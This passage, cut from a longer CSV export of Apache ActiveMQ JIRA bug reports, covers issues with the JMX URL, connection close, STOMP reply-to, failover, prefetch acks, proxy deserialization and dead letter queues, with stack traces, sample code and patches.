I will submit a patch to enhance the web console behavior :)",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,92458,,,Sat Nov 02 22:18:07 UTC 2013,,,,,,,,,,,"0|i0albr:",59728,,,,,,,,,,,,,,,,,,,,,"27/Oct/11 15:51;gtully;moved out to 5.x pending patch;;;","02/Nov/13 22:18;davsclaus;The new console supports multiple number of brokers in the JVM.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq:list doesn't use the correct Karaf JMX URL by default,AMQ-3552,12527991,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jbonofre,jbonofre,20/Oct/11 17:49,28/Oct/11 07:48,14/Jul/23 05:43,28/Oct/11 07:48,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"After a fresh ActiveMQ installation on Karaf, the activemq:list command doesn't use the correct JMX URL by default:

Connecting to JMX URL: service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
ERROR: java.lang.RuntimeException: Failed to execute list task. Reason: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.NameNotFoundException: jmxrmi
java.lang.RuntimeException: Failed to execute list task. Reason: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.NameNotFoundException: jmxrmi
        at org.apache.activemq.console.command.ListCommand.runTask(ListCommand.java:53)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:316)
        at org.apache.activemq.karaf.commands.ActiveMQCommandSupport.doExecute(ActiveMQCommandSupport.java:46)
        at org.apache.karaf.shell.console.OsgiCommandSupport.execute(OsgiCommandSupport.java:38)
        at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:35)
        at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
        at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:474)
        at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:400)
        at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
        at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
        at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
        at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:89)
        at org.apache.karaf.shell.console.jline.Console.run(Console.java:218)
        at java.lang.Thread.run(Thread.java:662)


Whereas it should use service:jmx:rmi:///jndi/rmi://localhost:1099/karaf-root

More over, ActiveMQ should use the Karaf serviceURL property.

I'm gonna submit a patch.",,ffang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3247,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,92456,,,Fri Oct 28 07:48:22 UTC 2011,,,,,,,,,,,"0|i0aiov:",59301,,,,,,,,,,,,,,,,,,,,,"23/Oct/11 02:13;ffang;Hi JB,

This issue already get fixed by AMQ-3247 and SMX4-784.
With this fix the output is

karaf@root> activemq:list 
Connecting to JMX URL: service:jmx:rmi:///jndi/rmi://localhost:1099/karaf-root
BrokerName = default


Freeman;;;","23/Oct/11 07:21;jbonofre;Thanks for the update Freeman. I tried with ActiveMQ 5.5.0 on Karaf 2.2.4. I will try using ActiveMQ 5.6.0 SNAPSHOT to check if it's fixed (outside ServiceMix).;;;","23/Oct/11 07:32;ffang;As I mentioned AMQ-3247 and SMX4-784 work together fixed it, so besides use Activemq 5.6-SNAPSHOT you also need
add
 
+#
+# Activemq JMX configuration
+#
+activemq.jmx.url=service:jmx:rmi:///jndi/rmi://localhost:1099/karaf-${karaf.name}
+activemq.jmx.user=smx
+activemq.jmx.password=smx
+
+
to karaf etc/system.properties to make it work.

Freeman;;;","28/Oct/11 07:48;gtully;resolving based on freeman's comments. thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Calling Connection.close() on interrupted thread generates InterruptedIOException and leaks Connection,AMQ-3547,12527550,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,martin.beranek,martin.beranek,18/Oct/11 08:13,27/Nov/15 14:13,14/Jul/23 05:43,29/Oct/11 21:44,5.5.0,,,,,5.13.0,5.6.0,,JMS client,,,,0,,,,,,,,,"Similar to https://issues.apache.org/jira/browse/AMQ-3529

call close() method on connection raise JMSException with InterruptedIOException as cause

Sample program:

public static void main(String[] args) throws Exception {
	ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(""tcp://localhost:61616"");
	Connection connection = connectionFactory.createConnection();
	Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
	final Thread mainThread = Thread.currentThread();
	new Thread() {

		public void run() {
			// this thread interrupt main thread after 1s
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
			}
			mainThread.interrupt();
		};
	}.start();

	try {
		//wait for interrupt
		Thread.sleep(10000);
	} catch (InterruptedException e) {
		Thread.currentThread().interrupt();
	}

	try {
		// this generate exception - bug???
		connection.close();
	} catch (JMSException e) {
		e.printStackTrace();
	}
	// non-daemon thread responsible for connection still running, program
	// will not terminate
}


when I remove line with Session obtain, everything works OK",,gtully,lichtin,martin.beranek,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3529,,,,,,,,,,,AMQ-2191,,,,,,,,,,,,,"29/Oct/11 08:28;martin.beranek;AMQ3529Test.java;https://issues.apache.org/jira/secure/attachment/12501437/AMQ3529Test.java","18/Oct/11 15:08;tabish;AMQ3529Test.java;https://issues.apache.org/jira/secure/attachment/12499548/AMQ3529Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,88768,,,Fri Nov 27 14:13:31 UTC 2015,,,,,,,,,,,"0|i0aipb:",59303,,,,,,,,,,,,,,,,,,,,,"18/Oct/11 15:08;tabish;Attached a unit test based on your sample code.  No exceptions or errors are seen when run against trunk.;;;","21/Oct/11 22:35;tabish;Could not reproduce this with supplied code, if you can make the attached JUnit test case reproduce this behavior please reopen and attach the new test.;;;","27/Oct/11 07:15;martin.beranek;new junit test that correctly simulate problem;;;","27/Oct/11 07:16;martin.beranek;corrected test;;;","27/Oct/11 13:49;gtully;@Martin, you need to tick the license grant option on that latest test attachment.;;;","27/Oct/11 20:43;tabish;The fix looks to be fairly trivial, if you can update your test attachment with the license grant we should be able to get this in a 5.6 release.;;;","29/Oct/11 08:28;martin.beranek;I have to reupload junit test bacause of license.;;;","29/Oct/11 21:44;tabish;Fix applied in trunk, thanks for getting the test going.;;;","27/Nov/15 13:00;gtully;As part of the reqworked fix for https://issues.apache.org/jira/browse/AMQ-2191 - the need to wrap close operaitons with suspended interrupts goes away. There is a more general form of your test that verifies all is still good.
Essentially, the suspend/resume interrupt is moved into FutureResponse where the InterruptedException is handled as a failure 'only' during a request. Requests and oneways can be safely invoked while interrupted and the interrupted state is retained.

It would be great if you could cast your eyes over the reworked fix in AMQ-2191 ;;;","27/Nov/15 14:13;tabish;Looks good, ship it!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP connector: unexpected reply-to value for remote temporary topic,AMQ-3543,12527106,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,chris.barrow,chris.barrow,13/Oct/11 21:42,14/Oct/11 21:46,14/Jul/23 05:43,14/Oct/11 20:54,5.x,,,,,5.6.0,,,STOMP,,,,0,,,,,,,,,"The reply-to header on a MESSAGE frame resulting from the sending of a message (SEND) with the reply-to header set to a temporary topic is in the form /temp-topic/<local-temp-topic-name> rather than the expected 
/remote-temp-topic/<system_generated_name>

This only happens when the same connection is used for sending and receiving messages. When a temporary queue is used, the reply-to appears as /remote-temp-queue/xxx as expected. So even if one takes the position that it is reasonable for the local name to be used given that everything is on the same connection, there is an inconsistency between the topic and queue cases. For our purposes we would prefer that the remote form be used always, because we are actually servicing two different users on the same connection (first user does the SEND, second user receives the MESSAGE).

Test case for the underlying ActiveMQ bug is attached: StompRemoteTempTopic.java

To reproduce, drop this file into $ACTIVEMQ_HOME/example/src, edit build.xml in the example
directory to add the following:

<target name=""bug"" depends=""compile"" description=""Runs test case for replyTo TempTopic bug"">
<echo>Running a Stomp example</echo>
<java classname=""StompRemoteTempTopic"" fork=""yes"" maxmemory=""100M"">
<classpath refid=""javac.classpath"" />
<jvmarg value=""-server"" />
</java>
</target>

and run by issuing the command ""ant bug"". Output is as follows:

[echo] Running a Stomp example
[java] =====================================================
[java] Test run using temporary topic
[java] -----------------------------------------------------
[java] Sending request message: SEND with reply-to=/temp-topic/2C26441740C0ECC9tt1
[java] Received request message: MESSAGE with reply-to=/temp-topic/2C26441740C0ECC9tt1
[java] Response MESSAGE received
[java] =====================================================
[java] Test run using temporary queue
[java] -----------------------------------------------------
[java] Sending request message: SEND with reply-to=/temp-queue/2C26441740C0ECC9tt1
[java] Received request message: MESSAGE with reply-to=/remote-temp-queue/ID:ChrisBarrow-lap-61815-1318539910206-4:6:1
[java] Response MESSAGE received

This makes it easy to see that for the queue case the reply-to is set to the remote temporary queue but for the topic case the local temporary topic is specified.
",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Oct/11 21:46;chris.barrow;StompRemoteTempTopic.java;https://issues.apache.org/jira/secure/attachment/12498936/StompRemoteTempTopic.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,85477,,,Fri Oct 14 21:46:50 UTC 2011,,,,,,,,,,,"0|i0aipj:",59304,,,,,,,,,,,,,,,,,,,,,"14/Oct/11 20:54;tabish;Fix applied in trunk, the reply-to destinations will be set to the same as what was given in the original message.  The remote names shouldn't leak from the Stomp transport.  Test case added.;;;","14/Oct/11 21:34;chris.barrow;Wow, thanks for such a quick response! Just want to check my understanding of your fix. Does it mean the received MESSAGE with reply-to ( received as a result of the SEND) will now have reply-to = '/temp-queue/...' or '/temp-topic/...'? 

What about the case where two connections are used (one connection owns the temporary destination and emits the SEND with reply-to, a second connection receives the MESSAGE). Presumably in that case the reply-to would have to be '/remote-temp-queue/...' or '/remote-temp-topic/...' since the temporary destination actually belongs to the other connection?;;;","14/Oct/11 21:46;tabish;From the client side the replyTo destination's parent connection should be opaque, so all connections would receive the same /temp-topic/ or /temp-queue/ values.  Its up to your clients to ensure that the name's of the temp destinations that they create are unique, using a UUID for instance.  The remote prefix is used internally by amq to match up its own destination structures and shouldn't have been leaking out of the Stomp transport.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Using failover: with static discovery in a network connector to choose from a master/slave tuple leads to hangs and invalid states,AMQ-3542,12527083,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Oct/11 19:33,30/Apr/12 10:08,14/Jul/23 05:43,13/Oct/11 20:23,5.4.2,5.5.0,,,,5.6.0,,,Connector,Transport,,,0,failover,master,network,slave,,,,,"static discovery will try to connect to all provided urls. When the list is a master/slave pair with shared storage, only one will active, leading log messages indicating repeated failure to connect.
A potential solution is to use failover: just to pick a url but let it delegate failover to the network connector such that the network bridge is correctly stopped/restarted.
  {{static:(failover:(tcp://a:61616,tcp://slave:61616)?maxReconnectAttempts=..)}}
This does not work reliably atm, due to inconsistency in the failover reconnect logic, a network connectors interest in transport interruption/resumption and the lack of thread safety in tracking existing bridges.

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3575,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,85452,,,Mon Apr 30 10:08:53 UTC 2012,,,,,,,,,,,"0|i0aipr:",59305,,,,,,,,,,,,,,,,,,,,,"13/Oct/11 20:23;gtully;fix and test in: http://svn.apache.org/viewvc?rev=1183062&view=rev

{{static:(failover:(a,b)?maxReconnectAttempts=0)}} now works reliably to choose a working url from (a,b) and report failures without trying to reconnect/failover. The network connector then gets to recover using its stop/restart logic.
This is a usage pattern for {{failover:}} where it is used solely to pick a valid broker url. It does *not* try to recover a failed connection. Network connectors need to manage failed connections themselves b/c they are not simple jms client connections.

Note: this commit changes the default value of maxReconnectAttempts for the failover: transport. A value of 0 now disables reconnections, the default for infinite retries is now -1.;;;","30/Apr/12 10:08;mserrano;note: Make sure you do not have randomize=false on your failover uri as I did.  I copied it from a place where that makes sense.  In this situation, it means the {{a}} part of the failover would always be chosen when recovery occurs and it will never fail over.  That was a wasted day.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Prefetch state can be incorrect when transacted redelivery of duplicates occurs, causing stalled queue",AMQ-3539,12526886,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,mserrano,mserrano,12/Oct/11 18:01,30/Jan/13 12:14,14/Jul/23 05:43,30/Jan/13 12:14,5.5.0,,,,,5.8.0,,,Broker,JMS client,,,0,,,,,,,,,"* In ActiveMQMessageConsumer, delivery acks are generated by receive() calls and by the dispatch() method when transacted redelivery of duplicates occurs.  These delivery acks are consolidated by calling ackLater which batches them up using first/last message id and sends the acks as appropriate w.r.t. the prefetch size.
* On the broker, the prefetch window is extended by checking the last message id, finding where it is in the dispatched queue and incrementing the prefetchExtension accordingly.  This algorithm depends on the consumer maintaining the dispatch order in its consolidated delivery acks.
* When the transacted redelivery occurs, it happens in a separate thread than the receive, operating on the latest delivered message.  The delivery acks from the receive thread are arbitrarily delayed (but in order of dispatch) depending on client action.  The mixing of these can result in an out of order consolidated delivery ack.

Real example (the client and broker logs are mixed to make it easier to follow; the dispatch logs come from my own custom logging plugin):
{noformat}
2011-10-12 11:51:51,712 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-3] - Dispatching message [ID:XXX-45585-1318434687322-0:68:1:1:1]
2011-10-12 11:51:51,834 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-43] - Dispatching message [ID:XXX-60241-1318434687532-0:56:1:1:3]
2011-10-12 11:51:51,835 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-43] - Dispatching message [ID:XXX-45585-1318434687322-0:68:1:1:2]

2011-10-12 11:51:51,836 DA [ActiveMQ Session Task-1] - ID:XXX-60241-1318434687532-0:33:1:1 tracking transacted redelivery of duplicate: ActiveMQTextMessage {commandId = 827, responseRequired = true, messageId = ID:XXX-45585-1318434687322-0:68:1:1:2, originalDestination = null, originalTransactionId = null, producerId = ID:XXX-45585-1318434687322-0:68:1:1, destination = queue://indexer.index-content-dispatcher, transactionId = null, expiration = 0, timestamp = 1318434696398, arrival = 0, brokerInTime = 1318434696461, brokerOutTime = 1318434711835, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@305e3ad0, dataStructure = null, redeliveryCounter = 0, size = 0, properties = XXX }

2011-10-12 11:51:51,876 TRACE ActiveMqBroker [ActiveMQ Transport: tcp:///127.0.0.1:55235] - firstId: ID:XXX-45585-1318434687322-0:68:1:1:2, lastId: ID:XXX-45585-1318434687322-0:68:1:1:1, dest: queue://indexer.index-content-dispatcher, acktype:0, individualAck:false, deliveredAck:true, messageAck:true, standardAck:false

2011-10-12 11:51:51,878 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-8] - Dispatching message [ID:XXX-60241-1318434687532-0:56:1:1:4]

2011-10-12 11:51:51,879 DA [ActiveMQ Session Task-1] - ID:XXX-60241-1318434687532-0:33:1:1 tracking transacted redelivery of duplicate: ActiveMQTextMessage {commandId = 840, responseRequired = true, messageId = ID:XXX-60241-1318434687532-0:56:1:1:4, originalDestination = null, originalTransactionId = null, producerId = ID:XXX-60241-1318434687532-0:56:1:1, destination = queue://indexer.index-content-dispatcher, transactionId = null, expiration = 0, timestamp = 1318434696518, arrival = 0, brokerInTime = 1318434696600, brokerOutTime = 1318434711878, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@332a4674, dataStructure = null, redeliveryCounter = 0, size = 0, properties = XXX }

2011-10-12 11:51:51,903 TRACE ActiveMqBroker [ActiveMQ Transport: tcp:///127.0.0.1:55235] - firstId: ID:XXX-60241-1318434687532-0:56:1:1:4, lastId: ID:XXX-60241-1318434687532-0:56:1:1:3, dest: queue://indexer.index-content-dispatcher, acktype:0, individualAck:false, deliveredAck:true, messageAck:true, standardAck:false

2011-10-12 11:51:51,905 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-8] - Dispatching message [ID:XXX-45585-1318434687322-0:68:1:1:3]

{noformat}

In the first ack received by the broker, you can see that message {{68:1:1:2}} is the first id and {{68:1:1:1}} is the last id.  The broker never looks at the first id and will consider this a delivery ack of everything up to {{68:1:1:1}} (which was the first message dispatched).  Thus this mixing results in a incorrect delivery count on the part of the broker.

An easy fix which would sometimes prematurely extend the prefetch window would be to always send transacted redelivery acks immediately (or consolidate them separately from receive originated delivery acks).  Since transacted redelivery acks always get triggered on messages delivered later than the receive acks this would cause the broker to think that all the earlier messages had been delivered also.  This might be inappropriate with really large prefetch sizes, although this is tempered by the fact that this only occurs in failover situations.  

Another fix might be to enqueue the transacted redelivered messages and do the filtering of these types of messages in the dequeue method which would result in proper ordering of the delivery acks.

Anything else would seem to require explicit broker accounting of each delivered message.  I'm willing to try to implement one of these fixes (I'm leaning to the dequeue filtering) but would like some guidance.

",,ceposta,davsclaus,donnchadh,gtully,mserrano,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74254,,,Wed Jan 30 12:14:29 UTC 2013,,,,,,,,,,,"0|i0al67:",59703,,,,,,,,,,,,,,,,,,,,,"12/Oct/11 23:44;tabish;Creating a unit test that demonstrates your issue would be helpful here.;;;","28/Feb/12 18:39;mserrano;I have confirmed this bug exists in 5.6 trunk.  I will be able to work on a unit test soon hopefully.;;;","28/Feb/12 18:46;mserrano;Patch I'm using for the moment (this is the ""easy"" fix I mention above)

{code:java}
Index: ActiveMQMessageConsumer.java
===================================================================
--- ActiveMQMessageConsumer.java	(revision 50578)
+++ ActiveMQMessageConsumer.java	(working copy)
@@ -1353,7 +1353,9 @@
                                 if (transactedIndividualAck) {
                                     immediateIndividualTransactedAck(md);
                                 } else {
-                                    ackLater(md, MessageAck.DELIVERED_ACK_TYPE);
+                                  // ATTIVIO, fix for AMQ-3539
+                                  MessageAck ack = new MessageAck(md, MessageAck.DELIVERED_ACK_TYPE, 1);
+                                  session.sendAck(ack);
                                 }
                             }
                         }
{code};;;","19/Sep/12 12:41;davsclaus;Martin, thanks for reporting and with the details you do.
Have you been running with your ""patch"" in production for a while? And did that fix it for you?

;;;","19/Sep/12 12:42;davsclaus;Lets see if we can revisit and find a good solution for this after the 5.7 release.;;;","19/Sep/12 13:18;mserrano;We have been using this patch successfully since reporting the issue.  It definitely fixes the issue.  Unfortunately I have not had the time to reproduce this in a simple unit test outside of our environment.  It is easy to reproduce in our environment -- we have several failover stress tests with heavy message traffic that we run in a loop.;;;","30/Jan/13 12:14;gtully;fix looks good (there is no harm in premature extension of prefetch as it is capped by the broker) and no regression in org.apache.activemq.transport.failover.FailoverRedeliveryTransactionTest

applied with thanks in http://svn.apache.org/viewvc?rev=1440366&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ClassLoadingAwareObjectInputStream cannot handle deserializing proxies with mixed JDK & non-JDK interfaces,AMQ-3537,12526717,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jason.yankus,jason.yankus,11/Oct/11 18:54,31/Oct/11 22:34,14/Jul/23 05:43,31/Oct/11 22:34,5.5.0,,,,,5.6.0,,,JMS client,,,,0,,,,,,,,,"When the ActiveMQ client attempts to unpack an ObjectMessage that contains a proxy with a mix of JDK and non-JDK interfaces the ClassLoadingAwareObjectInputStream chooses ONLY the ClassLoader from  the first interface in the array of interfaces represented by the proxy.  This means that if a proxy's first interface is a JDK class (java.util.List, java.sql.Blob) the core ClassLoader is used.  In the event that a non-JDK interface is present in the list of proxied interfaces the same core ClassLoader is used.  The Proxy.getProxyClass subsequently throws an IllegalArgumentException because the non-JDK interface class cannot be loaded by the core ClassLoader.

This problem is extant during deserialization of an ObjectMessage payload that contains a proxy that implements [java.sql.Blob, org.hibernate.engine.jdbc.WrappedBlob, java.io.Serializable] (a blob proxy created by [hibernate SerializableBlobProxy|https://github.com/hibernate/hibernate-core/blob/3.6.7.Final/hibernate-core/src/main/java/org/hibernate/engine/jdbc/SerializableBlobProxy.java]).   The impact of this bug is that users of Hibernate cannot use ActiveMQ as a messaging framework if they need to package ValueObjects that have mapped lobs.  ","JDK 1.6.0, RHEL 6.0, ActiveMQ 5.5.0, Tomcat 7, Hibernate 3.6.7.Final, Spring 3.0.3.RELEASE",jason.yankus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Oct/11 18:57;jason.yankus;AMQ3537Test.groovy;https://issues.apache.org/jira/secure/attachment/12498646/AMQ3537Test.groovy","12/Oct/11 15:29;jason.yankus;AMQ3537Test.java;https://issues.apache.org/jira/secure/attachment/12498768/AMQ3537Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,59366,,,Mon Oct 31 22:34:44 UTC 2011,,,,,,,,,,,"0|i0aiq7:",59307,,,,,,,,,,,,,,,,,,,,,"11/Oct/11 18:57;jason.yankus;AMQ3537Test.groovy is a test case demonstrating the bug.  The list of interfaces at the top of the test can be manipulated to show that the ClassLoadingAwareObjectInputStream is only choosing the ClassLoader from the first interface in the array.;;;","11/Oct/11 19:51;tabish;Any chance you can port your unit test to Java, then it could be included in the test suite to validate any future changes.  Also in order to include patches or tests in the source you need to ensure that you tick the license grant to apache when you upload your files.;;;","12/Oct/11 15:29;jason.yankus;Here is a simple java port of the groovy test case.;;;","31/Oct/11 22:34;tabish;Apply fix and add provided test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Virtual Topic Subscriber and Individual Dead Letter Queue Handling,AMQ-3536,12526689,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,smacey,smacey,11/Oct/11 16:37,14/Oct/11 13:08,14/Jul/23 05:43,14/Oct/11 13:08,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Summary: 
Transactional Acknowledgement with Virtual Topic / Subscriber Queues does not indicate which subscriber had a problem consuming the messages. Messages are simply delivered to Topic specific DLQ rather than to the Subscriber/Consumer specific DLQ.

Steps to create issue:

Configure the Individual Dead Letter Queue policy in Fuse Message Broker. 
Next create an ActiveMQ Virtual Topic with Subscriber Queue(s).
Send messages to Virtual Topic
Rollback/abort ack for one message (consistently) until this message gets delivered to the dead letter queue.

Result:
Message is sent to the Topic Specific Dead Letter Queue rather than to the DLQ specific to the Subscriber Queue.


Resolution:
Patch and unit test are are attached.
This test verifies that all undelivered messages sent to a consumers listening on a queue associated with a virtual topic with be forwarded to separate DLQ's.

Note that the broker config, Individual Dead Letter Strategy, needs to have the enable audit set to false to allows duplicate messages sent from a topic to individual consumers to be forwarded to the DLQ's.
  
<deadLetterStrategy>
	<bean xmlns=""http://www.springframework.org/schema/beans"" class=""org.apache.activemq.broker.region.policy.IndividualDeadLetterStrategy"">
        	<property name=""useQueueForQueueMessages"" value=""true""></property>
                <property name=""processNonPersistent"" value=""true""></property>
                <property name=""processExpired"" value=""false""></property>
                <property name=""enableAudit"" value=""false""></property>
        </bean>
</deadLetterStrategy>
		

","Windows XP
Fuse Message Broker version ActiveMQ trunk ",smacey,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Oct/11 16:48;smacey;VirtualDLQPatch.patch;https://issues.apache.org/jira/secure/attachment/12498625/VirtualDLQPatch.patch","14/Oct/11 00:37;smacey;activemq_dlq.xml;https://issues.apache.org/jira/secure/attachment/12498963/activemq_dlq.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,59331,,,Fri Oct 14 13:08:32 UTC 2011,,,,,,,Patch Available,,,,"0|i0aiqf:",59308,,,,,,,,,,,,,,,,,,,,,"11/Oct/11 16:48;smacey;Patch + Unit test;;;","13/Oct/11 23:39;tabish;The patch seems to reference a file ""activemq_dlq.xml"" that doesn't exist on trunk.  Think you can update the patch to add a complete file, or attach the necessary file here?;;;","14/Oct/11 00:37;smacey;Hi Timothy, I've attached the file activemq_dlq.xml.;;;","14/Oct/11 13:08;tabish;Patch applied, thanks for the great test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQMessageConsumer auto ack of duplicates always sends a standard ack,AMQ-3535,12526651,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,mserrano,mserrano,11/Oct/11 12:40,15/Jan/13 22:39,14/Jul/23 05:43,15/Jan/13 22:39,5.5.0,,,,,5.6.0,,,JMS client,,,,0,,,,,,,,,"When the ActiveMQMessageConsumer auto acks a duplicate, it always sends a standard ack.  This occurs even when the session was opened in individual acknowledge mode.  This results in the acknowledgments usually generating the ""unmatched ack"" message, causing the ack to be dropped.  Since this is a duplicate, generally things are okay, but the spurious error message is troubling and the inflight and dequeue counts will be wrong from then on.

